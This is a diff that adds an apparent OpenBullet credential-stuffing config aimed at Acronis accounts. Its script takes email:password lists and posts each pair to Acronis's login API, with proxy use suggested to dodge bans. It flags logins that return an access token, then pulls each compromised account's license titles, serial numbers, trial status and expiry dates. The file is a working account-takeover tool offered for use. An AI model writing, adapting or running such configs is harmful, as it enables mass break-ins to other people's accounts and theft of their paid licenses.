@@ -1,0 +1,56 @@
+[SETTINGS]
+{
+  "Name": "Acronis + Full Capture",
+  "SuggestedBots": 3,
+  "LastModified": "2018-08-29T00:47:27.9829993+00:00",
+  "AdditionalInfo": "If you get banned , just force to use with proxies , Enjoy",
+  "Author": "PaparazziTeam",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#URL1 REQUEST POST "https://account.acronis.com/v2/auth/login" AutoRedirect=TRUE 
+  CONTENT "{\"email\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json; charset=utf-8" 
+  COOKIE "Cookie: _ga=GA1.2.343869550.1525117531; _gid=GA1.2.124006457.1525117531; _ym_uid=1525117534599280282; _ym_visorc_30785543=w; _ym_isad=2; optimizelyEndUserId=oeu1525117813960r0.3121210470269291; optimizelySegments=%7B%22653483495%22%3A%22gc%22%2C%22662192665%22%3A%22referral%22%2C%22663330683%22%3A%22false%22%2C%222871510016%22%3A%22none%22%7D; optimizelyBuckets=%7B%7D; LPVID=VlY2Q3MTE0NGUzMzliYjc2; LPSID-86273716=6n82PrgjQuuGpfP5X2S_YQ; _uetsid=_uetdcf6514f" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Referer: https://account.acronis.com/auth/login" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "\"access_token\"" 
+  KEYCHAIN Failure OR 
+    KEY "Sent credentials are invalid." 
+    KEY "\"licenses\":[]" 
+    KEY "shortcut icon\" href=static/favicon.ico><" 
+#URL2 REQUEST GET "https://account.acronis.com/v2/licenses/" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "expire" 
+  KEYCHAIN CUSTOM "FREE" OR 
+    KEY "\"licenses\":[]" 
+    KEY "total\":0" 
+#Product PARSE "<SOURCE>" LR "title\":\"" "\"" Recursive=TRUE -> CAP "title" "" "" 
+#Serial PARSE "<SOURCE>" LR "serial_number\":\"" "\"" Recursive=TRUE -> CAP "Serial" "" "" 
+#isTrial PARSE "<SOURCE>" LR "trial\":" "," Recursive=TRUE -> CAP "isTrial" "" "" 
+#Expire PARSE "<SOURCE>" LR "expire\":" "," Recursive=TRUE -> CAP "Expire" "" "" 
